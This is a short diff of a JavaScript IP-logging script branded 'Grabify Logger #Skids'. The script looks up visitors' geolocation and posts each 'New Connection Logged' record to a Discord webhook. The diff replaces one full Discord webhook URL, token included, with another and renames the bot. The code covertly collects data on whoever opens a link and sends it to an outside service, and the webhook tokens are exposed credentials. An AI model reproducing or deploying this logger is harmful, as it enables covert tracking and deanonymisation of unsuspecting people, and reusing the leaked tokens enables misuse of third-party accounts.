@@ -2,7 +2,7 @@
 const geoAPI = "https://ipapi.co/json/";
 
 // REDACTED: Replace this with your actual webhook URL. Keep it secret!
-const webhookURL = "https://discord.com/api/webhooks/1538788853186568244/EgwsZDszBdHjjHF1Wyo5z2yAnHOBZw_Q3qQPDZqqIXC3bbY8tua6rYOReAHcsrZ8M0Hp";
+const webhookURL = "https://discord.com/api/webhooks/1539734446310428702/36pURjCerJjY_2MagfQuMfWvVZBaQkfJw1D4vlpSV734WXViS785x4R3xMVna3GZCslw";
 
 async function getClientData() {
     try {
@@ -35,7 +35,7 @@ async function sendToDiscord(info) {
 
     // Formatting the payload using Discord Embeds for a much neater UI
     const payload = {
-        username: "235, Grabify Logger #Skids", // You can change the bot's display name here
+        username: "235, Grabify Logger #Skids (Link 1)", // You can change the bot's display name here
         embeds: [
             {
                 title: "New Connection Logged",
